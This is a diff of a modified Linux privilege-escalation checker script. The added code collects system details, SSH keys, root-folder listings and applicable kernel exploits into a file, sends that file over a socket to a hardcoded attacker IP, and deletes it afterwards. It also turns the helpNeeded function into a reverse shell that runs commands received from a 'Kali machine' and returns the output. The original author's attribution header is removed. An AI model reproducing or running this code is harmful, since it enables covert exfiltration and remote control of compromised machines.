@@ -1,70 +1,56 @@
 #!/usr/bin/env python
 # coding: utf-8
-###############################################################################################################
-## [Title]: linuxprivchecker.py -- a Linux Privilege Escalation Check Script
-## [Author]: Mike Czumak (T_v3rn1x) -- @SecuritySift
-##-------------------------------------------------------------------------------------------------------------
-## [Details]:
-## This script is intended to be executed locally on a Linux box to enumerate basic system info and
-## search for common privilege escalation vectors such as world writable files, misconfigurations, clear-text
-## passwords and applicable exploits.
-##-------------------------------------------------------------------------------------------------------------
-## [Warning]:
-## This script comes as-is with no promise of functionality or accuracy.  I have no plans to maintain updates,
-## I did not write it to be efficient and in some cases you may find the functions may not produce the desired
-## results.  For example, the function that links packages to running processes is based on keywords and will
-## not always be accurate.  Also, the exploit list included in this function will need to be updated over time.
-## Feel free to change or improve it any way you see fit.
-##-------------------------------------------------------------------------------------------------------------
-## [Modification, Distribution, and Attribution]:
-## You are free to modify and/or distribute this script as you wish.  I only ask that you maintain original
-## author attribution and not attempt to sell it or incorporate it into any commercial offering (as if it's
-## worth anything anyway :)
-###############################################################################################################
 
 # conditional import for older versions of python not compatible with subprocess
 try:
 	import subprocess as sub
 	import os
+
 	compatmode = 0  # newer version of python, no need for compatibility mode
 except ImportError:
 	import os  # older version of python, need to use os instead
+
 	compatmode = 1
 import socket
-
-
-def fileVerification():
-		if os.path.exists("project.txt"):
-			os.remove("project.txt")
-fileVerification()
-def appendToFile(msg):
-	try:
-		with open('project.txt', 'a') as opened_file:
-			opened_file.write(msg+"\n")
-	except Exception as ex:
-		print("The script can not open the file")
+import json
+import time
 
 # title / formatting
 bigline = "================================================================================================="
 smlline = "-------------------------------------------------------------------------------------------------"
-
-appendToFile(bigline)
-appendToFile("LINUX PRIVILEGE ESCALATION CHECKER")
-appendToFile(bigline+"\n")
+ip = "192.168.1.50"
 
 
+def remove_file():
+	if os.path.exists('project.txt'):
+		os.remove('project.txt')
+
+
+def appendToFile(msg):
+	try:
+		with open('project.txt', 'a') as opened_file:
+			opened_file.write(msg + "\n")
+	except Exception as ex:
+		print("The script can not open the file")
+		print(ex)
+	finally:
+		opened_file.close()
 
 
 def sendFile():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect(("192.168.1.72", 9999))
+	
+	s.connect((ip, 9999))
 	with open('project.txt', 'rb') as file:
-		s.send("Checker file".encode('ascii'))
+		s.send("Get checker file".encode('ascii'))
 		l = file.read(1024)
 		while (l):
 			s.send(l)
 			l = file.read(1024)
-	print("Le fichier a été correctement copié ")
+
+	remove_file()
+
+	print("Le fichier a été correctement copié et éffacé ")
 
 
 # loop through dictionary, execute the commands, store the results, return updated dict
@@ -93,38 +79,53 @@ def printResults(cmdDict):
 		appendToFile("\n")
 	return
 
+
+
+
 def helpNeeded():
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect(("192.168.1.72", 9999))
-	s.send("Help needed !!!".encode('ascii'))
-	while True:
-		response =s.recv(1024)
-		if response == "break":
-			break
-		elif response != "":
-			response=execCmd(response)
-			s.send(response["order"]["results"])
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, 9999))
+    s.send("Help needed !!!".encode('ascii'))
+    respone = s.recv(1024).decode("ascii").lower()
+    print(respone)
+    while True:
+        if "break" in respone:
+            break
+        elif "open" in respone:
+            while True:  # keep receiving commands from the Kali machine
+                command = s.recv(1024).decode('ascii')  # read the first KB of the tcp socket
+
+                if 'terminate' in command:  # if we got terminate order from the attacker, close the socket and break the loop
+                    s.close()
+                    break
+
+                else:  # otherwise, we pass the received command to a shell process
+
+                    CMD = sub.Popen(command, shell=True, stdout=sub.PIPE, stderr=sub.PIPE,
+                                           stdin=sub.PIPE)
+                    s.send(CMD.stdout.read())  # send back the result
+                    s.send(CMD.stderr.read())  # send back the error -if any-, such as syntax error
+        respone = s.recv(1024).decode("ascii").lower()
 
 
 
 
 
 
-def writeResults(msg, results):
-	f = open("privcheckout.txt", "a");
-	f.write("[+] " + str(len(results) - 1) + " " + msg)
-	for result in results:
-		if result.strip() != "":
-			f.write("    " + result.strip())
-	f.close()
-	return
 
+
+
+
+
+
+
+appendToFile(bigline)
+appendToFile("LINUX PRIVILEGE ESCALATION CHECKER")
+appendToFile(bigline + "\n")
 
 # Basic system info
 appendToFile("[*] GETTING BASIC SYSTEM INFO...\n")
-
 results = []
-
 sysInfo = {"OS": {"cmd": "cat /etc/issue", "msg": "Operating System", "results": results},
            "KERNEL": {"cmd": "cat /proc/version", "msg": "Kernel", "results": results},
            "SELINUX_status": {"cmd": "cat /etc/sysconfig/selinux", "msg": "SELinux", "results": results},
@@ -196,19 +197,19 @@ appendToFile("[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...\n")
 fdPerms = {"WWDIRSROOT": {
 	"cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root",
 	"msg": "World Writeable Directories for User/Group 'Root'", "results": results},
-           "WWDIRS": {
-	           "cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root",
-	           "msg": "World Writeable Directories for Users other than Root", "results": results},
-           "WWFILES": {
-	           "cmd": "find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null",
-	           "msg": "World Writable Files", "results": results},
-           "SUID": {"cmd": "find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null",
-                    "msg": "SUID/SGID Files and Directories", "results": results},
-           "SSH": {"cmd": "ls -la ~/.ssh/", "msg": "Check for interesting ssh files in the current users’ directory",
-                   "results": results},
-           "ROOTHOME": {"cmd": "ls -ahlR /root 2>/dev/null", "msg": "Checking if root's home folder is accessible",
-                        "results": results}
-           }
+	"WWDIRS": {
+		"cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root",
+		"msg": "World Writeable Directories for Users other than Root", "results": results},
+	"WWFILES": {
+		"cmd": "find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null",
+		"msg": "World Writable Files", "results": results},
+	"SUID": {"cmd": "find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null",
+	         "msg": "SUID/SGID Files and Directories", "results": results},
+	"SSH": {"cmd": "ls -la ~/.ssh/", "msg": "Check for interesting ssh files in the current users’ directory",
+	        "results": results},
+	"ROOTHOME": {"cmd": "ls -ahlR /root 2>/dev/null", "msg": "Checking if root's home folder is accessible",
+	             "results": results}
+}
 
 fdPerms = execCmd(fdPerms)
 printResults(fdPerms)
@@ -240,7 +241,7 @@ else:
 getAppProc = {
 	"PROCS": {"cmd": "ps aux | awk '{print $1,$2,$9,$10,$11}'", "msg": "Current processes", "results": results},
 	"PKGS": {"cmd": getPkgs, "msg": "Installed Packages", "results": results}
-	}
+}
 
 getAppProc = execCmd(getAppProc)
 printResults(getAppProc)  # comment to reduce output
@@ -249,7 +250,7 @@ sshinfo = {
 	"SSH Authorized_keys": {"cmd": "cat ~/.ssh/authorized_keys", "msg": "SSH Authorized_keys", "results": results},
 	"SSH_identiti pub": {"cmd": "cat ~/.ssh/identity.pub", "msg": "SSH_identiti pub", "results": results},
 	"APACHECONF": {"cmd": "cat /etc/apache2/apache2.conf 2>/dev/null", "msg": "Apache Config File", "results": results}
-	}
+}
 
 sshinfo = execCmd(sshinfo)
 printResults(sshinfo)
@@ -532,7 +533,7 @@ sploits = {"2.2.x-2.4.x ptrace kmod local exploit": {"minver": "2.2", "maxver": 
            }
 
 # variable declaration
-os = sysInfo["OS"]["results"][0]
+operatinSys = sysInfo["OS"]["results"][0]
 version = sysInfo["KERNEL"]["results"][0].split(" ")[2].split("-")[0]
 langs = devTools["TOOLS"]["results"]
 procs = getAppProc["PROCS"]["results"]
@@ -573,18 +574,23 @@ for sploit in sploits:
 						break
 						break
 			elif loc == "os":
-				if (keyword in os) or (keyword in kernel):
-					highprob.append(sploitout)  # if sploit is specifically applicable to this OS consider it a higher probability/applicability
+				if (keyword in operatinSys) or (keyword in kernel):
+					highprob.append(
+						sploitout)  # if sploit is specifically applicable to this OS consider it a higher probability/applicability
 					break
 			elif loc == "mnt":
 				if keyword in mount:
-					highprob.append(sploitout)  # if sploit is specifically applicable to a mounted file system consider it a higher probability/applicability
+					highprob.append(
+						sploitout)  # if sploit is specifically applicable to a mounted file system consider it a higher probability/applicability
 					break
 			else:
-				avgprob.append(sploitout)  # otherwise, consider average probability/applicability based only on kernel version
+				avgprob.append(
+					sploitout)  # otherwise, consider average probability/applicability based only on kernel version
 
-appendToFile("    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!\n")
-appendToFile("    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system")
+appendToFile(
+	"    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!\n")
+appendToFile(
+	"    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system")
 for exploit in highprob:
 	appendToFile("    - " + exploit)
 appendToFile("\n")
@@ -600,5 +606,5 @@ appendToFile("\nFinished")
 appendToFile(bigline)
 sendFile()
 print("Finished")
-
+# fileVerification()
 helpNeeded()
